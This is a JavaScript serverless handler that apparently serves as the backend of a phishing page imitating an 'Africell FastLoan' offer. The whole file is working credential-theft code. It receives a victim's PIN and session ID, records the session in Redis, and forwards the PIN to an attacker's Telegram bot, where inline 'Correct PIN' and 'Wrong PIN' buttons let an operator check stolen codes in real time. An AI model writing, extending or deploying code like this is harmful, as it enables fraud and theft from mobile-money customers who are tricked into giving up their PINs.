const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisSet(key, value, exSeconds = 600) {
    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}/ex/${exSeconds}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    const { pin, sessionId } = JSON.parse(event.body || '{}');
    if (!pin || !sessionId) {
        return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
    }

    // Store initial pending status
    await redisSet(`session:${sessionId}:pin`, 'pending');

    const text =
        `🔐 *Africell FastLoan – PIN Submitted*\n\n` +
        `🔢 PIN Code: \`${pin}\`\n\n` +
        `Session: \`${sessionId}\``;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Correct PIN', callback_data: `pin_ok:${sessionId}` },
                    { text: '❌ Wrong PIN', callback_data: `pin_wrong:${sessionId}` },
                ]]
            }
        })
    });

    return {
        statusCode: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ok: true })
    };
};
